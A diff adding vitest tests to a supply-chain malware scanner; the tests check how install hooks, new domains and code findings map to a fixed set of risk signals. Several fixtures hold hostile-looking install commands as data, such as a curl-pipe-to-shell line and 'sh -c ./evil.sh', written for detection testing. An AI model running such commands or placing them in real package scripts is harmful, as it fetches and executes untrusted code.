@@ -2,14 +2,19 @@ import { describe, it, expect, vi, afterEach } from 'vitest'
 import { createHash } from 'node:crypto'
 import type { Finding } from '../../../src/scanner/rules'
 import type { TarballScanResult } from '../../../src/scanner/intel/deep-dependency'
+import type { DependencyDelta } from '../../../src/scanner/intel/types'
 import { sha512Hex } from '../../../src/scanner/intel/content-intel/identity'
 import {
   buildContributePayload,
   serializeScanEvidence,
   findingToContributeItem,
   truncateUtf8,
+  normalizeSignals,
+  signalSetFromScan,
+  identityFromManifest,
   MAX_MANIFEST_BYTES,
   MAX_ITEMS_PER_LIST,
+  CONTRIBUTE_SIGNALS,
 } from '../../../src/scanner/intel/cloud-contribute'
 
 afterEach(() => {
@@ -187,5 +192,226 @@ describe('serializeScanEvidence', () => {
     const out = serializeScanEvidence(sampleScan(), findings)!
     expect(out.alerts).toHaveLength(2)
     expect(out.alerts[0]).toMatchObject({ severity: 'CRITICAL', type: 'supply_chain' })
+  })
+})
+
+describe('normalizeSignals (N3.2 closed enum)', () => {
+  it('accepts only values of the closed enum and emits them in stable enum order', () => {
+    expect(normalizeSignals(['binary', 'network', 'install_script'])).toEqual(['install_script', 'network', 'binary'])
+  })
+
+  it('drops unknown values, dedupes, and never exceeds 32 entries', () => {
+    const out = normalizeSignals([...CONTRIBUTE_SIGNALS, ...CONTRIBUTE_SIGNALS, 'not_a_signal', 'shell', 'eval'])
+    expect(out).toEqual([...CONTRIBUTE_SIGNALS])
+    expect(out.length).toBeLessThanOrEqual(32)
+    expect(new Set(out).size).toBe(out.length)
+    expect(out).toEqual(expect.arrayContaining([...CONTRIBUTE_SIGNALS]))
+  })
+
+  it('returns an empty array for garbage or empty input', () => {
+    expect(normalizeSignals(['bogus', 'x'])).toEqual([])
+    expect(normalizeSignals([])).toEqual([])
+  })
+})
+
+describe('signalSetFromScan (Oracle signal → N3.2 enum mapping)', () => {
+  function delta(partial: Partial<DependencyDelta>): DependencyDelta {
+    return {
+      packageName: 'p',
+      fromVersion: '',
+      toVersion: '1.0.0',
+      filesChanged: 0,
+      newDomains: [],
+      newNetworkCalls: 0,
+      newDependencies: [],
+      newCapabilities: [],
+      newScripts: [],
+      newBinaries: [],
+      risk: 'low',
+      summary: 's',
+      ...partial,
+    }
+  }
+  const hook = (over: Partial<{ script: string; command: string; dangerous: boolean }>) => ({
+    script: 'postinstall',
+    command: '',
+    dangerous: false,
+    ...over,
+  })
+  const finding = (title: string, category: Finding['category'] = 'code'): Finding => ({
+    severity: 'medium',
+    category,
+    title,
+    description: 'd',
+  })
+
+  it('maps each closed-enum value from the right Oracle signal', () => {
+    expect(signalSetFromScan(delta({ newCapabilities: ['Shell'] }), [], [])).toEqual(['child_process'])
+    expect(signalSetFromScan(delta({ newCapabilities: ['Dynamic Code'] }), [], [])).toEqual(['runtime_execution'])
+    expect(signalSetFromScan(delta({ newCapabilities: ['Network'] }), [], [])).toEqual(['network'])
+    expect(signalSetFromScan(delta({ newCapabilities: ['Filesystem'] }), [], [])).toEqual(['filesystem'])
+    expect(signalSetFromScan(delta({ newDomains: ['evil.example'] }), [], [])).toEqual(['network'])
+    expect(signalSetFromScan(delta({ newScripts: ['postinstall.js'] }), [], [])).toEqual(['install_script'])
+    expect(signalSetFromScan(delta({ newBinaries: ['dropper.exe'] }), [], [])).toEqual(['binary'])
+    expect(signalSetFromScan(undefined, [hook({ command: 'curl http://x.sh | sh', dangerous: true })], [])).toEqual(['install_script', 'download'])
+    expect(signalSetFromScan(undefined, [hook({ command: 'sh -c ./evil.sh', dangerous: true })], [])).toEqual(['install_script', 'runtime_execution'])
+    expect(signalSetFromScan(undefined, [hook({ command: 'node setup.mjs', dangerous: true })], [])).toEqual(['install_script', 'runtime_execution'])
+    expect(signalSetFromScan(undefined, [], [finding('Hardcoded secret detected', 'secret')])).toEqual(['credential_access'])
+    expect(signalSetFromScan(undefined, [], [finding('Base64-decoded payload')])).toEqual(['encoded_payload'])
+    expect(signalSetFromScan(undefined, [], [finding('Hex-encoded obfuscation')])).toEqual(['obfuscation'])
+    expect(signalSetFromScan(undefined, [], [finding('Obfuscated JavaScript (array-based string mapping)')])).toEqual(['obfuscation'])
+    expect(signalSetFromScan(undefined, [], [finding('Outbound network request')])).toEqual(['network'])
+    expect(signalSetFromScan(undefined, [], [finding('OS command execution detected')])).toEqual(['child_process'])
+    expect(signalSetFromScan(undefined, [], [finding('File system access')])).toEqual(['filesystem'])
+    expect(signalSetFromScan(undefined, [], [finding('Unsafe eval() detected')])).toEqual(['runtime_execution'])
+    expect(signalSetFromScan(undefined, [], [finding('Dynamic Function constructor')])).toEqual(['runtime_execution'])
+    expect(signalSetFromScan(undefined, [], [finding('setTimeout with string argument')])).toEqual(['runtime_execution'])
+    expect(signalSetFromScan(undefined, [], [finding('Dynamic require() detected')])).toEqual(['runtime_execution'])
+  })
+
+  it('dedupes overlapping sources into a single enum entry', () => {
+    const out = signalSetFromScan(
+      delta({ newCapabilities: ['Shell'], newDomains: ['evil.example'] }),
+      [hook({ command: 'node setup.mjs', dangerous: true })],
+      [finding('OS command execution detected'), finding('Outbound network request')],
+    )
+    expect(out).toEqual(['install_script', 'network', 'child_process', 'runtime_execution'])
+    expect(new Set(out).size).toBe(out.length)
+  })
+
+  it('stays conservative: ambiguous signals are deliberately omitted', () => {
+    expect(signalSetFromScan(delta({ newCapabilities: ['Crypto'] }), [], [])).toEqual([])
+    expect(signalSetFromScan(delta({ newCapabilities: ['Shell'], newDomains: ['cdn.example'] }), [], [])).not.toContain('suspicious_url')
+    expect(signalSetFromScan(undefined, [hook({ command: 'echo hi', dangerous: false })], [])).toEqual(['install_script'])
+    expect(signalSetFromScan(undefined, [], [finding('Suspicious module import: net')])).toEqual([])
+    expect(signalSetFromScan(undefined, [], [finding('Large file added', 'config')])).toEqual([])
+    expect(signalSetFromScan(undefined, [], [finding('Environment file committed', 'config')])).toEqual([])
+    expect(signalSetFromScan(undefined, [], [finding('Binary file added', 'dependency')])).toEqual([])
+  })
+})
+
+describe('identityFromManifest (N3.2 dependency identity)', () => {
+  it('extracts name/version from the tarball package.json and fixes ecosystem to npm', () => {
+    expect(identityFromManifest(JSON.stringify({ name: 'evildep', version: '1.2.3' }))).toEqual({
+      ecosystem: 'npm',
+      package: 'evildep',
+      version: '1.2.3',
+    })
+  })
+
+  it('omits version when absent and trims whitespace from name/version', () => {
+    expect(identityFromManifest(JSON.stringify({ name: '  pkg  ' }))).toEqual({ ecosystem: 'npm', package: 'pkg' })
+    expect(identityFromManifest(JSON.stringify({ name: 'pkg', version: ' ' }))).toEqual({ ecosystem: 'npm', package: 'pkg' })
+  })
+
+  it('includes packageHash (the tarball SRI sha512) only when a stable hash exists', () => {
+    expect(identityFromManifest(JSON.stringify({ name: 'pkg' }), 'sha512:' + 'a'.repeat(128))).toEqual({
+      ecosystem: 'npm',
+      package: 'pkg',
+      packageHash: 'sha512:' + 'a'.repeat(128),
+    })
+    expect(identityFromManifest(JSON.stringify({ name: 'pkg' }), '')).not.toHaveProperty('packageHash')
+    expect(identityFromManifest(JSON.stringify({ name: 'pkg' }))).not.toHaveProperty('packageHash')
+  })
+
+  it('returns undefined when the manifest is missing, malformed, or name is unusable', () => {
+    expect(identityFromManifest(undefined)).toBeUndefined()
+    expect(identityFromManifest(null)).toBeUndefined()
+    expect(identityFromManifest('')).toBeUndefined()
+    expect(identityFromManifest('not-json')).toBeUndefined()
+    expect(identityFromManifest(JSON.stringify({ version: '1.0.0' }))).toBeUndefined()
+    expect(identityFromManifest(JSON.stringify({ name: 42 }))).toBeUndefined()
+    expect(identityFromManifest(JSON.stringify({ name: '   ' }))).toBeUndefined()
+    expect(identityFromManifest(JSON.stringify({ name: 'x'.repeat(129) }))).toBeUndefined()
+  })
+})
+
+describe('N3.2 payload integration', () => {
+  const alerts = [{ type: 'supply_chain', severity: 'CRITICAL' as const, riskLevel: 9, message: 'x', category: 'supply_chain' }]
+  const deltas = [{ type: 'network', severity: 'MEDIUM' as const, riskLevel: 5, message: 'New network endpoint: evil.example', evidence: 'evil.example', category: 'supply_chain' }]
+  const identity = { ecosystem: 'npm' as const, package: 'evildep', version: '1.0.0' }
+
+  it('attaches signals and identity only when present, and never changes manifestHash', () => {
+    const base = buildContributePayload({ manifest: manifestJson(), state: 'MALICIOUS', risk: 'critical', alerts, deltas })
+    expect(base.evidence.signals).toBeUndefined()
+    expect(base.identity).toBeUndefined()
+    const withExtras = buildContributePayload({
+      manifest: manifestJson(),
+      state: 'MALICIOUS',
+      risk: 'critical',
+      alerts,
+      deltas,
+      signals: ['install_script', 'network', 'binary'],
+      identity,
+    })
+    expect(withExtras.evidence.signals).toEqual(['install_script', 'network', 'binary'])
+    expect(withExtras.identity).toEqual(identity)
+    expect(withExtras.evidence.manifestHash).toBe(base.evidence.manifestHash)
+    expect(withExtras.evidence.manifestHash).toBe(
+      createHash('sha256').update(JSON.stringify({ alerts, deltas })).digest('hex').slice(0, 24),
+    )
+  })
+
+  it('normalizes out-of-order or unknown signals before sending', () => {
+    const payload = buildContributePayload({
+      manifest: manifestJson(),
+      state: 'MALICIOUS',
+      risk: 'critical',
+      alerts,
+      deltas,
+      signals: ['binary', 'nope', 'network', 'install_script', 'network'],
+    })
+    expect(payload.evidence.signals).toEqual(['install_script', 'network', 'binary'])
+  })
+
+  it('serializes the full fresh-scan evidence with signals and identity', () => {
+    const out = serializeScanEvidence(sampleScan(), [])!
+    expect(out.signals).toEqual(['install_script', 'network', 'child_process', 'runtime_execution', 'binary'])
+    expect(out.identity).toEqual({
+      ecosystem: 'npm',
+      package: 'evildep',
+      version: '1.0.0',
+      packageHash: 'sha512:' + 'a'.repeat(128),
+    })
+    expect(buildContributePayload(out).evidence.signals).toEqual(out.signals)
+    expect(buildContributePayload(out).identity).toEqual(out.identity)
+  })
+
+  it('omits signals for a clean scan with no signal sources; identity carries no packageHash when no SRI exists', () => {
+    const scan = sampleScan({
+      contentId: undefined,
+      files: new Map([['package.json', JSON.stringify({ name: 'cleanpkg', version: '1.0.0' })]]) as Map<string, string>,
+      delta: {
+        packageName: 'cleanpkg',
+        fromVersion: '',
+        toVersion: '1.0.0',
+        filesChanged: 2,
+        newDomains: [],
+        newNetworkCalls: 0,
+        newDependencies: [],
+        newCapabilities: [],
+        newScripts: [],
+        newBinaries: [],
+        risk: 'low',
+        summary: 'clean',
+      },
+      lifecycleScripts: [],
+    })
+    const out = serializeScanEvidence(scan, [])!
+    expect(out.signals).toBeUndefined()
+    expect(out.identity).toEqual({ ecosystem: 'npm', package: 'cleanpkg', version: '1.0.0' })
+    const payload = buildContributePayload(out)
+    expect(payload.evidence.signals).toBeUndefined()
+    expect(payload.identity).toEqual(out.identity)
+  })
+
+  it('omits identity when the manifest carries no package name, even with signals', () => {
+    const scan = sampleScan({
+      files: new Map([['package.json', JSON.stringify({ version: '1.0.0' })]]) as Map<string, string>,
+    })
+    const out = serializeScanEvidence(scan, [])!
+    expect(out.signals).toEqual(['install_script', 'network', 'child_process', 'runtime_execution', 'binary'])
+    expect(out.identity).toBeUndefined()
+    expect(buildContributePayload(out).identity).toBeUndefined()
   })
 })
